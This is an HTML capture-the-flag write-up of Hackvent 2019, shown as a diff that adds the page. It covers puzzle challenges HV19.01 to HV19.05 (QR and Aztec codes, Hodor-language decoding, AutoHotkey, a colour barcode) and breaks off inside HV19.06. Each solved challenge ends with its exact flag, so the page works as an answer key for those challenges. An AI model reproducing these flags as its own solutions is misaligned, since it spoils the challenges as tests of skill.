@@ -1,0 +1,1945 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="author" content="ludus" />
+  <meta name="dcterms.date" content="2019-12-31" />
+  <meta name="keywords" content="hackvent, hackvent-2019, hackvent2019, compass-security, ctf, security, reverse engineering" />
+  <title>Hackvent 2019 - Write-up</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {  background-color: #f8f8f8; }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ef2929; } /* Alert */
+    code span.an { color: #8f5902; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #c4a000; } /* Attribute */
+    code span.bn { color: #0000cf; } /* BaseN */
+    code span.cf { color: #204a87; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4e9a06; } /* Char */
+    code span.cn { color: #000000; } /* Constant */
+    code span.co { color: #8f5902; font-style: italic; } /* Comment */
+    code span.cv { color: #8f5902; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #8f5902; font-weight: bold; font-style: italic; } /* Documentation */
+    code span.dt { color: #204a87; } /* DataType */
+    code span.dv { color: #0000cf; } /* DecVal */
+    code span.er { color: #a40000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #0000cf; } /* Float */
+    code span.fu { color: #000000; } /* Function */
+    code span.im { } /* Import */
+    code span.in { color: #8f5902; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #204a87; font-weight: bold; } /* Keyword */
+    code span.op { color: #ce5c00; font-weight: bold; } /* Operator */
+    code span.ot { color: #8f5902; } /* Other */
+    code span.pp { color: #8f5902; font-style: italic; } /* Preprocessor */
+    code span.sc { color: #000000; } /* SpecialChar */
+    code span.ss { color: #4e9a06; } /* SpecialString */
+    code span.st { color: #4e9a06; } /* String */
+    code span.va { color: #000000; } /* Variable */
+    code span.vs { color: #4e9a06; } /* VerbatimString */
+    code span.wa { color: #8f5902; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+  <link rel="stylesheet" href="pandoc.css" />
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+</head>
+<body>
+<header id="title-block-header">
+<h1 class="title">Hackvent 2019 - Write-up</h1>
+<p class="author">ludus</p>
+<p class="date">2019-12-31</p>
+</header>
+<nav id="TOC" role="doc-toc">
+<ul>
+<li><a href="#introduction">Introduction</a>
+<ul>
+<li><a href="#where-to-find-this-document">Where to find this document</a></li>
+</ul></li>
+<li><a href="#hv1901---censored">HV19.01 - Censored</a>
+<ul>
+<li><a href="#given">Given</a></li>
+<li><a href="#approaches">Approaches</a></li>
+<li><a href="#flag">Flag</a></li>
+</ul></li>
+<li><a href="#hv1902---triangulation">HV19.02 - Triangulation</a>
+<ul>
+<li><a href="#given-1">Given</a></li>
+<li><a href="#approach">Approach</a></li>
+<li><a href="#flag-1">Flag</a></li>
+</ul></li>
+<li><a href="#hv1903---hodor-hodor-hodor">HV19.03 - Hodor, Hodor, Hodor</a>
+<ul>
+<li><a href="#given-2">Given</a></li>
+<li><a href="#approach-1">Approach</a></li>
+<li><a href="#flag-2">Flag</a></li>
+</ul></li>
+<li><a href="#hv1904---password-policy-circumvention">HV19.04 - Password Policy Circumvention</a>
+<ul>
+<li><a href="#given-3">Given</a></li>
+<li><a href="#approach-2">Approach</a></li>
+<li><a href="#flag-3">Flag</a></li>
+</ul></li>
+<li><a href="#hv1905---santa-parcel-tracking">HV19.05 - Santa Parcel Tracking</a>
+<ul>
+<li><a href="#given-4">Given</a></li>
+<li><a href="#approach-3">Approach</a></li>
+<li><a href="#flag-4">Flag</a></li>
+</ul></li>
+<li><a href="#hv1906---bacon-and-eggs">HV19.06 - Bacon and eggs</a>
+<ul>
+<li><a href="#given-5">Given</a></li>
+<li><a href="#approach-4">Approach</a></li>
+<li><a href="#flag-5">Flag</a></li>
+</ul></li>
+<li><a href="#hv1907---santa-rider">HV19.07 - Santa rider</a>
+<ul>
+<li><a href="#given-6">Given</a></li>
+<li><a href="#approach-5">Approach</a></li>
+<li><a href="#flag-6">Flag</a></li>
+</ul></li>
+<li><a href="#hv1908---smilencryptor-40">HV19.08 - SmileNcryptor 4.0</a>
+<ul>
+<li><a href="#given-7">Given</a></li>
+<li><a href="#aproach">Aproach</a></li>
+<li><a href="#flag-7">Flag</a></li>
+<li><a href="#credits">Credits</a></li>
+</ul></li>
+<li><a href="#hv1909---santas-quick-response-30">HV19.09 - Santas Quick Response 3.0</a>
+<ul>
+<li><a href="#given-8">Given</a></li>
+<li><a href="#approach-6">Approach</a></li>
+<li><a href="#flag-8">Flag</a></li>
+</ul></li>
+<li><a href="#hv1910---guess-what">HV19.10 - Guess what</a>
+<ul>
+<li><a href="#given-9">Given</a></li>
+<li><a href="#approach-7">Approach</a></li>
+<li><a href="#flag-9">Flag</a></li>
+</ul></li>
+<li><a href="#hv1911---frolicsome-santa-jokes-api">HV19.11 - Frolicsome Santa Jokes API</a>
+<ul>
+<li><a href="#given-10">Given</a></li>
+<li><a href="#approach-8">Approach</a></li>
+<li><a href="#flag-10">Flag</a></li>
+</ul></li>
+<li><a href="#hv1912---back-to-basic">HV19.12 - back to basic</a>
+<ul>
+<li><a href="#given-11">Given</a></li>
+<li><a href="#approach-9">Approach</a></li>
+<li><a href="#credits-1">Credits</a></li>
+<li><a href="#flag-11">Flag</a></li>
+</ul></li>
+<li><a href="#hv1913---trieme">HV19.13 - TrieMe</a>
+<ul>
+<li><a href="#given-12">Given</a></li>
+<li><a href="#approach-10">Approach</a></li>
+<li><a href="#credits-and-kudos">Credits and Kudos</a></li>
+<li><a href="#flag-12">Flag:</a></li>
+</ul></li>
+<li><a href="#hv1914---achtung-das-flag">HV19.14 - Achtung das Flag</a>
+<ul>
+<li><a href="#given-13">Given</a></li>
+<li><a href="#approach-11">Approach</a></li>
+<li><a href="#flag-13">Flag</a></li>
+</ul></li>
+<li><a href="#hv1915---santas-workshop">HV19.15 - Santa's Workshop</a>
+<ul>
+<li><a href="#given-14">Given</a></li>
+<li><a href="#approach-12">Approach</a></li>
+<li><a href="#flag-14">Flag</a></li>
+</ul></li>
+<li><a href="#hv1916---b0rked-calculator">HV19.16 - B0rked Calculator</a>
+<ul>
+<li><a href="#given-15">Given</a></li>
+<li><a href="#approach-13">Approach</a></li>
+<li><a href="#flag-15">Flag</a></li>
+<li><a href="#other-notes">Other notes</a></li>
+</ul></li>
+<li><a href="#hv1917---unicode-portal">HV19.17 - Unicode Portal</a>
+<ul>
+<li><a href="#given-16">Given</a></li>
+<li><a href="#approach-14">Approach</a></li>
+<li><a href="#fläg">Fläg</a></li>
+</ul></li>
+<li><a href="#hv1918---dance-with-me">HV19.18 - Dance with me</a>
+<ul>
+<li><a href="#given-17">Given</a></li>
+<li><a href="#approach-15">Approach</a></li>
+<li><a href="#flag-16">Flag</a></li>
+</ul></li>
+<li><a href="#hv1919---">HV19.19 - 🎅</a>
+<ul>
+<li><a href="#given-18">Given</a></li>
+<li><a href="#approach-16">Approach</a></li>
+<li><a href="#flag-17">Flag</a></li>
+</ul></li>
+<li><a href="#hv1920---i-want-to-play-a-game">HV19.20 - i want to play a game</a>
+<ul>
+<li><a href="#given-19">Given</a></li>
+<li><a href="#aproach-1">Aproach</a></li>
+<li><a href="#flag-18">Flag</a></li>
+</ul></li>
+<li><a href="#hv1921---happy-christmas-256">HV19.21 - Happy christmas 256</a>
+<ul>
+<li><a href="#given-20">Given</a></li>
+<li><a href="#approach-17">Approach</a></li>
+<li><a href="#flag-19">Flag</a></li>
+<li><a href="#foundation">Foundation</a></li>
+</ul></li>
+<li><a href="#hv1922---the-command-is-lost">HV19.22 - The command... is lost</a>
+<ul>
+<li><a href="#given-21">Given</a></li>
+<li><a href="#approach-18">Approach</a></li>
+<li><a href="#credits-2">Credits</a></li>
+<li><a href="#flag-20">Flag</a></li>
+</ul></li>
+<li><a href="#hv1923---ida-pro">HV19.23 - IDA PRO</a>
+<ul>
+<li><a href="#given-22">Given</a></li>
+<li><a href="#approach-19">Approach</a></li>
+<li><a href="#credits-3">Credits</a></li>
+<li><a href="#flag-21">Flag</a></li>
+</ul></li>
+<li><a href="#hv1924---ham-radio">HV19.24 - Ham Radio</a>
+<ul>
+<li><a href="#given-23">Given</a></li>
+<li><a href="#approach-20">Approach</a></li>
+<li><a href="#credits-4">Credits</a></li>
+<li><a href="#flag-22">Flag</a></li>
+</ul></li>
+<li><a href="#hv19h01---hidden-one">HV19.H01 - Hidden One</a>
+<ul>
+<li><a href="#given-24">Given</a></li>
+<li><a href="#approach-21">Approach</a></li>
+<li><a href="#flag-23">Flag</a></li>
+</ul></li>
+<li><a href="#hv19h02---hidden-two">HV19.H02 - Hidden Two</a>
+<ul>
+<li><a href="#given-25">Given</a></li>
+<li><a href="#approach-22">Approach</a></li>
+<li><a href="#flag-24">Flag</a></li>
+</ul></li>
+<li><a href="#hv19h03---hidden-three">HV19.H03 - Hidden three</a>
+<ul>
+<li><a href="#given-26">Given</a></li>
+<li><a href="#approach-23">Approach</a></li>
+<li><a href="#flag-25">Flag</a></li>
+</ul></li>
+<li><a href="#hv19h04---hidden-four">HV19.H04 - Hidden Four</a>
+<ul>
+<li><a href="#given-27">Given</a></li>
+<li><a href="#approach-24">Approach</a></li>
+<li><a href="#credits-5">Credits</a></li>
+<li><a href="#flag-26">Flag</a></li>
+</ul></li>
+</ul>
+</nav>
+<h1 id="introduction">Introduction</h1>
+<p>This is the second time I participated in a <a href="https://hackvent.hacking-lab.com">Hackvent</a>. After last year, I tried to solve all challenges during this year's 2019 edition. And I succeeded.</p>
+<p>However, I would not have managed to complete all challenges in time without the help I've received. To start, I want to thank my soon-to-be wife for being so patient with me. As others have pointed out, Hackvent can be a pretty intense time for a relationship.</p>
+<p>Furthermore, I want to thank <em>mcia</em> who is always incredibly patient and always reaches out with a helping hand when I ask my n00b questions. Others who have given hints or helped in another way are <em>bread</em>, <em>0xCC</em>, <em>LogicalOverflow</em>, <em>each</em>, <em>DrSchottky</em>, <em>Wulgaru</em>, and <em>M.</em>. Thank you all, you've helped me learning and discovering new things, which is incredibly valuable and appreciated.</p>
+<p>Of course, I want to thank all the organizers and challenge creators. You've invested sweat, blood and probably tears to make this happen.</p>
+<p>Hereafter, you'll find a write-up of all challenges in Hackvent 2019 (taking place during December 2019) annotated with solution approaches, notes and comments by myself.</p>
+<p>Have fun.</p>
+<p>Yours,</p>
+<p>-ludus</p>
+<h2 id="where-to-find-this-document">Where to find this document</h2>
+<p>This document is intended to be published at <a href="https://maennel.github.io/hackvent2019">https://maennel.github.io/hackvent2019</a>.</p>
+<p>Comments, questions and improvements can be filed at <a href="https://github.com/maennel/hackvent2019/issues">https://github.com/maennel/hackvent2019</a>.</p>
+<h1 id="hv1901---censored">HV19.01 - Censored</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>M.</td>
+<td>easy</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given">Given</h2>
+<p>I got this little image, but it looks like the best part got censored on the way. Even the tiny preview icon looks clearer than this! Maybe they missed something that would let you restore the original content?</p>
+<p><img src="./f182d5f0-1d10-4f0f-a0c1-7cba0981b6da.jpg" alt="X-mas ball" /></p>
+<h2 id="approaches">Approaches</h2>
+<h3 id="one">One</h3>
+<p>Download the image. Extract the thumbnail with:</p>
+<pre><code>exif -e f182d5f0-1d10-4f0f-a0c1-7cba0981b6da.jpg
+</code></pre>
+<p>The QR code in the resulting thumbnail image was readable via ZXing.</p>
+<h3 id="two">Two</h3>
+<p>I had the pleasure to discover CyberChef (<a href="https://gchq.github.io/CyberChef">https://gchq.github.io/CyberChef</a>) now supports extracting files.</p>
+<p>With that "build step", the readable thumbnail image was produced as well.</p>
+<h2 id="flag">Flag</h2>
+<p><code>HV19{just-4-PREview!}</code></p>
+<h1 id="hv1902---triangulation">HV19.02 - Triangulation</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>DrSchottky</td>
+<td>easy</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-1">Given</h2>
+<p>Today we give away decorations for your Christmas tree. But be careful and do not break it.</p>
+<p>File: <a href="a5f47ab8-f151-4741-b061-d2ab331bf641.zip">Triangulation</a></p>
+<h2 id="approach">Approach</h2>
+<p>Unzipping produces an STL (Standard Triangle Language) file.</p>
+<p>I was able to look at the file first using view3dscene (a local software) and <a href="https://stephaneginier.com/sculptgl/">https://stephaneginier.com/sculptgl/</a>.</p>
+<p><img src="full_ball.png" alt="full ball" /></p>
+<p>The first impression was a 3D Hackvent christmas ball. Since these christmas balls usually are empty, I tried to zoom in quite quickly. Inside, a 3D Aztec code could be found.</p>
+<p><img src="screenshot_3d_aztec_code.png" alt="Coloured Aztec code" /></p>
+<p>And then the actual time consuming part began...</p>
+<p>Eventually, using the online tool, I was able to zoom in, so that I could see the entirety of the code with a resonable contrast. With ZXing not being able to decode, I stopped (to catch a train). On the way, I realized it was a 3D(!) code, which could be looked at from behind. Once the image was flipped, ZXing was happy and produced the flag.</p>
+<h2 id="flag-1">Flag</h2>
+<p><code>HV19{Cr4ck_Th3_B411!}</code></p>
+<h1 id="hv1903---hodor-hodor-hodor">HV19.03 - Hodor, Hodor, Hodor</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>otaku feat. trolli101</td>
+<td>easy</td>
+<td>fun; programming</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-2">Given</h2>
+<p><img src="b3e6e692-e685-4804-9d4f-dfa873ce80d9.jpg" alt="Hodor!!" /></p>
+<p>The following text was given:</p>
+<pre><code>$HODOR: hhodor. Hodor. Hodor!?  = `hodor?!? HODOR!? hodor? Hodor oHodor. hodor? , HODOR!?! ohodor!?  dhodor? hodor odhodor? d HodorHodor  Hodor!? HODOR HODOR? hodor! hodor!? HODOR hodor! hodor? ! 
+
+hodor?!? Hodor  Hodor Hodor? Hodor  HODOR  rhodor? HODOR Hodor!?  h4Hodor?!? Hodor?!? 0r hhodor?  Hodor!? oHodor?! hodor? Hodor  Hodor! HODOR Hodor hodor? 64 HODOR Hodor  HODOR!? hodor? Hodor!? Hodor!? .
+
+HODOR?!? hodor- hodorHoOodoOor Hodor?!? OHoOodoOorHooodorrHODOR hodor. oHODOR... Dhodor- hodor?! HooodorrHODOR HoOodoOorHooodorrHODOR RoHODOR... HODOR!?! 1hodor?! HODOR... DHODOR- HODOR!?! HooodorrHODOR Hodor- HODORHoOodoOor HODOR!?! HODOR... DHODORHoOodoOor hodor. Hodor! HoOodoOorHodor HODORHoOodoOor 0Hooodorrhodor HoOodoOorHooodorrHODOR 0=`;
+hodor.hod(hhodor. Hodor. Hodor!? );
+</code></pre>
+<h2 id="approach-1">Approach</h2>
+<p>Once again, I was on a completely wrong track to start with. Trying to find out about obfuscation possibilities in bash and or perl did not lead anywhere.</p>
+<p>And once again, the break-through idea came while not being in front of the screen, but doing something else.</p>
+<p>A quick DuckDuckGo for "Hodor Programming Language" lead to a page describing the syntax: <a href="http://www.hodor-lang.org/">http://www.hodor-lang.org/</a>. An online interpreter could be found at <a href="https://tio.run/#hodor">https://tio.run/#hodor</a> (this, btw, seems like a cool page for this kind of challenges... bookmarking...).</p>
+<p>The output produced was:</p>
+<pre><code>Awesome, you decoded Hodors language! 
+
+As sis a real h4xx0r he loves base64 as well.
+
+SFYxOXtoMDFkLXRoMy1kMDByLTQyMDQtbGQ0WX0=
+
+</code></pre>
+<p>And with a little CyberChef magic, this challenge was solvable entirely on the phone.</p>
+<h2 id="flag-2">Flag</h2>
+<p><code>HV19{h01d-th3-d00r-4204-ld4Y}</code></p>
+<h1 id="hv1904---password-policy-circumvention">HV19.04 - Password Policy Circumvention</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>DanMcFly</td>
+<td>easy</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-3">Given</h2>
+<p>Santa released a new password policy (more than 40 characters, upper, lower, digit, special).</p>
+<p>The elves can't remember such long passwords, so they found a way to continue to use their old (bad) password:</p>
+<p>Copied to clipboard</p>
+<pre><code>merry christmas geeks
+</code></pre>
+<p>File: <a href="6473254e-1cb3-444e-9dac-5baeaaaf6d11.zip">HV19-PPC.zip</a></p>
+<h2 id="approach-2">Approach</h2>
+<p>Extracting the zip file resulted in a .ahk file.</p>
+<p>AHK?? What is that? That's how I started...</p>
+<p>After learning about what it actually is and considering the script, I decided to re-activate my Windows 10 box I still had around.</p>
+<p>With AutoHotkey installed, I only had to type in the given string into a Notepad editor (however, I noticed elves must be very slow typers).</p>
+<p>The produced output was the flag below.</p>
+<h2 id="flag-3">Flag</h2>
+<p><code>HV19{R3memb3r, rem3mber - the 24th 0f December}</code></p>
+<h1 id="hv1905---santa-parcel-tracking">HV19.05 - Santa Parcel Tracking</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>inik</td>
+<td>easy</td>
+<td>fun</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-4">Given</h2>
+<p>To handle the huge load of parcels Santa introduced this year a parcel tracking system. He didn't like the black and white barcode, so he invented a more solemn barcode. Unfortunately the common barcode readers can't read it anymore, it only works with the pimped models santa owns. Can you read the barcode.</p>
+<p><img src="157de28f-2190-4c6d-a1dc-02ce9e385b5c.png" alt="Barcode" /></p>
+<h2 id="approach-3">Approach</h2>
+<p>During breakfast, the moment I started, retr0id already sloved the challenge. What does that mean? Once more, probbably that I again overthink the challenge. But here we are...</p>
+<p>"Not the solution" is what you get, no matter what color layer you filter out. Looking at the image, it's no wonder. Each bar has a component of all the three RGB colors.</p>
+<p>In addition, there's that misleading SP Tracking number: 1337-9999-4555-9. It's go the same length as "Not the solution", so it must be useful in some way, right? But what if not. What if everything that I got was just plain distractors and misleading hints...</p>
+<p>Together with my colleagues at work, we started looking more closely at the barcode's colors. Decoding the color of each bar of the barcode, we quickly found the pattern "HV19{" by looking only at the value of the blue RGB layer, being also the least significant byte of each value. Unfortunately, in the middle we confused the "<em>a</em>" for an "<em>=</em>" (can happen). After some back and forth, we still found the flag.</p>
+<p>Credits to Jean-Eudes, mcia, and the entire FAIRTIQ crew.</p>
+<h2 id="flag-4">Flag</h2>
+<p><code>HV19{D1fficult_to_g3t_a_SPT_R3ader}</code></p>
+<h1 id="hv1906---bacon-and-eggs">HV19.06 - Bacon and eggs</h1>
+<table>
+<thead>
+<tr class="header">
+<th>Author</th>
+<th>Level</th>
+<th>Categories</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>brp64</td>
+<td>easy</td>
+<td>fun; crypto</td>
+</tr>
+</tbody>
+</table>
+<h2 id="given-5">Given</h2>
+<p><img src="9bb928c6-491c-49aa-948b-cdf95496d073.jpg" alt="Bacon" /></p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb5-1"><a href="#cb5-1"></a><span class="kw">&lt;p&gt;&lt;em&gt;</span>F<span class="kw">&lt;/em&gt;</span>ra<span class="kw">&lt;em&gt;</span>n<span class="kw">&lt;/em&gt;</span>cis Baco<span class="kw">&lt;em&gt;</span>n<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>w<span class="kw">&lt;/em&gt;</span>a<span class="kw">&lt;em&gt;</span>s<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>a<span class="kw">&lt;/em&gt;</span>n E<span class="kw">&lt;em&gt;</span>ng<span class="kw">&lt;/em&gt;</span>lish ph<span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>l<span class="kw">&lt;em&gt;</span>os<span class="kw">&lt;/em&gt;</span>o<span class="kw">&lt;em&gt;</span>p<span class="kw">&lt;/em&gt;</span>her a<span class="kw">&lt;em&gt;</span>n<span class="kw">&lt;/em&gt;</span>d <span class="kw">&lt;em&gt;</span>s<span class="kw">&lt;/em&gt;</span>tat<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span>sm<span class="kw">&lt;em&gt;</span>a<span class="kw">&lt;/em&gt;</span>n w<span class="kw">&lt;em&gt;</span>h<span class="kw">&lt;/em&gt;</span>o se<span class="kw">&lt;em&gt;</span>rve<span class="kw">&lt;/em&gt;</span>d <span class="kw">&lt;em&gt;</span>a<span class="kw">&lt;/em&gt;</span>s At<span class="kw">&lt;em&gt;</span>t<span class="kw">&lt;/em&gt;</span>or<span class="kw">&lt;em&gt;</span>n<span class="kw">&lt;/em&gt;</span>ey Gen<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span>ral and as <span class="kw">&lt;em&gt;</span>L<span class="kw">&lt;/em&gt;</span>or<span class="kw">&lt;em&gt;</span>d<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>Ch<span class="kw">&lt;/em&gt;</span>an<span class="kw">&lt;em&gt;</span>ce<span class="kw">&lt;/em&gt;</span>l<span class="kw">&lt;em&gt;</span>l<span class="kw">&lt;/em&gt;</span>or of <span class="kw">&lt;em&gt;</span>En<span class="kw">&lt;/em&gt;</span>g<span class="kw">&lt;em&gt;</span>l<span class="kw">&lt;/em&gt;</span>an<span class="kw">&lt;em&gt;</span>d<span class="kw">&lt;/em&gt;</span>. Hi<span class="kw">&lt;em&gt;</span>s<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>w<span class="kw">&lt;/em&gt;</span>orks ar<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span> c<span class="kw">&lt;em&gt;</span>red<span class="kw">&lt;/em&gt;</span>it<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span>d w<span class="kw">&lt;em&gt;</span>ith<span class="kw">&lt;/em&gt;</span> d<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span>ve<span class="kw">&lt;em&gt;</span>lo<span class="kw">&lt;/em&gt;</span>pi<span class="kw">&lt;em&gt;</span>ng<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>t<span class="kw">&lt;/em&gt;</span>h<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span> sci<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span>nt<span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>fic me<span class="kw">&lt;em&gt;</span>t<span class="kw">&lt;/em&gt;</span>hod and re<span class="kw">&lt;em&gt;</span>m<span class="kw">&lt;/em&gt;</span>ai<span class="kw">&lt;em&gt;</span>ned<span class="kw">&lt;/em&gt;</span> in<span class="kw">&lt;em&gt;</span>fl<span class="kw">&lt;/em&gt;</span>u<span class="kw">&lt;em&gt;</span>en<span class="kw">&lt;/em&gt;</span>ti<span class="kw">&lt;em&gt;</span>al<span class="kw">&lt;/em&gt;</span> th<span class="kw">&lt;em&gt;</span>rou<span class="kw">&lt;/em&gt;</span>gh <span class="kw">&lt;em&gt;</span>t<span class="kw">&lt;/em&gt;</span>he s<span class="kw">&lt;em&gt;</span>cien<span class="kw">&lt;/em&gt;</span>tific <span class="kw">&lt;em&gt;</span>r<span class="kw">&lt;/em&gt;</span>ev<span class="kw">&lt;em&gt;</span>o<span class="kw">&lt;/em&gt;</span>l<span class="kw">&lt;em&gt;</span>u<span class="kw">&lt;/em&gt;</span>ti<span class="kw">&lt;em&gt;</span>o<span class="kw">&lt;/em&gt;</span>n.</span>
+<span id="cb5-2"><a href="#cb5-2"></a><span class="kw">&lt;em&gt;</span>B<span class="kw">&lt;/em&gt;</span>a<span class="kw">&lt;em&gt;</span>co<span class="kw">&lt;/em&gt;</span>n h<span class="kw">&lt;em&gt;</span>as<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>b<span class="kw">&lt;/em&gt;</span>e<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span>n ca<span class="kw">&lt;em&gt;</span>l<span class="kw">&lt;/em&gt;</span>led <span class="kw">&lt;em&gt;</span>th<span class="kw">&lt;/em&gt;</span>e <span class="kw">&lt;em&gt;</span>f<span class="kw">&lt;/em&gt;</span>ath<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span>r o<span class="kw">&lt;em&gt;</span>f<span class="kw">&lt;/em&gt;</span> emp<span class="kw">&lt;em&gt;</span>iric<span class="kw">&lt;/em&gt;</span>i<span class="kw">&lt;em&gt;</span>s<span class="kw">&lt;/em&gt;</span>m. <span class="kw">&lt;em&gt;</span>Hi<span class="kw">&lt;/em&gt;</span>s <span class="kw">&lt;em&gt;</span>wor<span class="kw">&lt;/em&gt;</span>ks ar<span class="kw">&lt;em&gt;</span>g<span class="kw">&lt;/em&gt;</span>ued for th<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span> po<span class="kw">&lt;em&gt;</span>ssi<span class="kw">&lt;/em&gt;</span>bi<span class="kw">&lt;em&gt;</span>li<span class="kw">&lt;/em&gt;</span>t<span class="kw">&lt;em&gt;</span>y<span class="kw">&lt;/em&gt;</span> of s<span class="kw">&lt;em&gt;</span>c<span class="kw">&lt;/em&gt;</span>ie<span class="kw">&lt;em&gt;</span>n<span class="kw">&lt;/em&gt;</span>tifi<span class="kw">&lt;em&gt;</span>c<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>kno<span class="kw">&lt;/em&gt;</span>wl<span class="kw">&lt;em&gt;</span>edg<span class="kw">&lt;/em&gt;</span>e b<span class="kw">&lt;em&gt;</span>a<span class="kw">&lt;/em&gt;</span>se<span class="kw">&lt;em&gt;</span>d<span class="kw">&lt;/em&gt;</span> onl<span class="kw">&lt;em&gt;</span>y<span class="kw">&lt;/em&gt;</span> u<span class="kw">&lt;em&gt;</span>p<span class="kw">&lt;/em&gt;</span>on i<span class="kw">&lt;em&gt;</span>n<span class="kw">&lt;/em&gt;</span>du<span class="kw">&lt;em&gt;</span>c<span class="kw">&lt;/em&gt;</span>t<span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>ve <span class="kw">&lt;em&gt;</span>r<span class="kw">&lt;/em&gt;</span>ea<span class="kw">&lt;em&gt;</span>s<span class="kw">&lt;/em&gt;</span>onin<span class="kw">&lt;em&gt;</span>g<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>a<span class="kw">&lt;/em&gt;</span>nd c<span class="kw">&lt;em&gt;</span>aref<span class="kw">&lt;/em&gt;</span>u<span class="kw">&lt;em&gt;</span>l<span class="kw">&lt;/em&gt;</span> o<span class="kw">&lt;em&gt;</span>bs<span class="kw">&lt;/em&gt;</span>er<span class="kw">&lt;em&gt;</span>v<span class="kw">&lt;/em&gt;</span>ation o<span class="kw">&lt;em&gt;</span>f<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span>v<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span>nt<span class="kw">&lt;em&gt;</span>s<span class="kw">&lt;/em&gt;</span> in <span class="kw">&lt;em&gt;</span>na<span class="kw">&lt;/em&gt;</span>tur<span class="kw">&lt;em&gt;</span>e<span class="kw">&lt;/em&gt;</span>. Mo<span class="kw">&lt;em&gt;</span>st<span class="kw">&lt;/em&gt;</span> <span class="kw">&lt;em&gt;</span>i<span class="kw">&lt;/em&gt;</span>mp<span class="kw">&lt;em&gt;</span>ort<span class="kw">&lt;/em&gt;</span>an<span class="kw">&lt;em&gt;</span>t<span 